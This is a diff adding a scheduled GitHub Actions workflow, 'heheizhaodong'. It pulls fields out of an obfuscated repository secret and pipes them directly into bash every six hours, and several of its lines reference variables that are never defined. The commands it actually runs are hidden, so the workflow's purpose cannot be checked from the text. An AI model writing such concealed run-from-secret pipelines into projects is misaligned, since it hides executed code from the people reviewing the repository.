@@ -1,0 +1,23 @@
+name: heheizhaodong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: heheizhaodong
+        env:
+          bb65761: ${{ secrets.bb65761 }}
+        run: |
+          echo $bb65761 | jq -r .rmju6859 | /bin/bash
+          echo $ajdw33726 | jq -r .h832 | /bin/bash
+          echo $d902 | jq -r .rrbw2067 | /bin/bash
+          echo $dd80 | jq -r .w64 | /bin/bash
+          echo $lpvx12016 | jq -r .gla7 | /bin/bash
+          echo $hkrkr7035 | jq -r .l074 | /bin/bash
+
